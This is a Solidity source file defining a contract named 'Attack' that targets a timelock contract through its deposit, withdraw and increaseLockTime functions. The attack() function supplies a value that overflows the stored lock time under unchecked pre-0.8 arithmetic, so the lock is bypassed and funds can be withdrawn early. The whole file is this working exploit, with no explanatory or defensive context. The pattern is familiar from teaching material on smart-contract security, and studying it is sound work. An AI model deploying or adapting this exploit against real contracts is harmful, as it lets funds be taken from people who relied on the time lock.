pragma solidity ^0.7.6;

interface ITimelock {
    function deposit() external payable;
    function lockTime(address) external view returns (uint);
    function withdraw() external;
    function increaseLockTime(uint) external;
}

contract Attack {
    address timeLock;

    constructor(address _timeLock) {
        timeLock = _timeLock;
    }

    fallback() external payable {}

    function deposit() public payable {
         ITimelock(timeLock).deposit{value: msg.value}();
    }

     function withdraw() public{
         ITimelock(timeLock).withdraw();
    }

    function attack() public{        
        //increaseTimeLock
        ITimelock(timeLock).increaseLockTime(
            type(uint).max + 1 -  ITimelock(timeLock).lockTime(address(this))
        );
    }

}